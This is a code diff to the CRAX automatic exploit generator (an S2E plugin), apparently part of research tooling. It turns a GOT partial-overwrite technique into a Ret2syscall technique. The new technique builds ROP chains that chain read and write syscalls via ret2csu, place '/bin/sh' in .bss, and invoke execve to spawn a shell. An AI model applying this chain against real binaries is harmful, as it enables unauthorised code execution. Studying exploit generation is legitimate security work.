@@ -19,29 +19,41 @@
 // SOFTWARE.
 
 #include <s2e/Plugins/CRAX/CRAX.h>
+#include <s2e/Plugins/CRAX/Exploit.h>
 #include <s2e/Plugins/CRAX/Techniques/Ret2csu.h>
-#include <s2e/Plugins/CRAX/Utils/StringUtil.h>
 
 #include <cassert>
-#include <fstream>
+#include <vector>
 
-#include "GotPartialOverwrite.h"
+#include "Ret2syscall.h"
 
 namespace s2e::plugins::crax {
 
-GotPartialOverwrite::GotPartialOverwrite() : Technique() {}
+Ret2syscall::Ret2syscall()
+    : Technique(),
+      m_syscallGadget() {
+    const Exploit &exploit = g_crax->getExploit();
+    const ELF &elf = exploit.getElf();
 
+    const std::string gadgetAsm = "syscall ; ret";
 
-bool GotPartialOverwrite::checkRequirements() const {
-    const ELF &elf = g_crax->getExploit().getElf();
+    if (exploit.resolveGadget(elf, gadgetAsm)) {
+        m_requiredGadgets.push_back(std::make_pair(&elf, gadgetAsm));
+        m_syscallGadget = BaseOffsetExpr::create(exploit, elf, Exploit::toVarName(gadgetAsm));
 
-    // read() must be present in the GOT of the target binary.
-    return Technique::checkRequirements() &&
-           !elf.checksec.hasFullRELRO &&
-           elf.symbols().find("read") != elf.symbols().end();
+    } else if (!elf.checksec.hasFullRELRO &&
+               elf.symbols().find("read") != elf.symbols().end()) {
+        using BaseType = BaseOffsetExpr::BaseType;
+        m_syscallGadget = BaseOffsetExpr::create<BaseType::SYM>(elf, "read");
+    }
 }
 
-std::vector<RopSubchain> GotPartialOverwrite::getRopSubchains() const {
+
+bool Ret2syscall::checkRequirements() const {
+    return Technique::checkRequirements() && m_syscallGadget;
+}
+
+std::vector<RopSubchain> Ret2syscall::getRopSubchains() const {
     using BaseType = BaseOffsetExpr::BaseType;
 
     const Exploit &exploit = g_crax->getExploit();
@@ -52,28 +64,30 @@ std::vector<RopSubchain> GotPartialOverwrite::getRopSubchains() const {
 
     // read(0, elf.got['read'], 1), setting RAX to 1.
     RopSubchain part1 = ret2csu->getRopSubchains(
-        BaseOffsetExpr::create<BaseType::SYM>(elf, "read"),
+        m_syscallGadget,
         ConstantExpr::create(0, Expr::Int64),
         BaseOffsetExpr::create<BaseType::GOT>(elf, "read"),
         ConstantExpr::create(1, Expr::Int64))[0];
 
-    // write(1, 0, 0), setting RAX to 0.
+    // syscall<1>(1, 0, 0), setting RAX to 0.
     RopSubchain part2 = ret2csu->getRopSubchains(
-        BaseOffsetExpr::create<BaseType::SYM>(elf, "read"),
+        m_syscallGadget,
         ConstantExpr::create(1, Expr::Int64),
         ConstantExpr::create(0, Expr::Int64),
         ConstantExpr::create(0, Expr::Int64))[0];
 
-    // Read "/bin/sh" into elf.bss(), setting RAX to 59.
+    // syscall<0>(0, elf.bss(), 59),
+    // reading "/bin/sh".ljust(59, b'\x00') to elf.bss()
     RopSubchain part3 = ret2csu->getRopSubchains(
-        BaseOffsetExpr::create<BaseType::SYM>(elf, "read"),
+        m_syscallGadget,
         ConstantExpr::create(0, Expr::Int64),
         BaseOffsetExpr::create<BaseType::BSS>(elf),
         ConstantExpr::create(59, Expr::Int64))[0];
 
-    // Return to sys_execve.
+    // syscall<59>("/bin/sh", 0, 0),
+    // i.e. sys_execve("/bin/sh", NULL, NULL)
     RopSubchain part4 = ret2csu->getRopSubchains(
-        BaseOffsetExpr::create<BaseType::SYM>(elf, "read"),
+        m_syscallGadget,
         BaseOffsetExpr::create<BaseType::BSS>(elf),
         ConstantExpr::create(0, Expr::Int64),
         ConstantExpr::create(0, Expr::Int64))[0];
@@ -94,8 +108,7 @@ std::vector<RopSubchain> GotPartialOverwrite::getRopSubchains() const {
     return { ret1, ret2, ret3 };
 }
 
-
-uint8_t GotPartialOverwrite::getLsbOfReadSyscall() const {
+uint8_t Ret2syscall::getLsbOfReadSyscall() const {
     const ELF &libc = g_crax->getExploit().getLibc();
 
     // Get __read() info from libc.
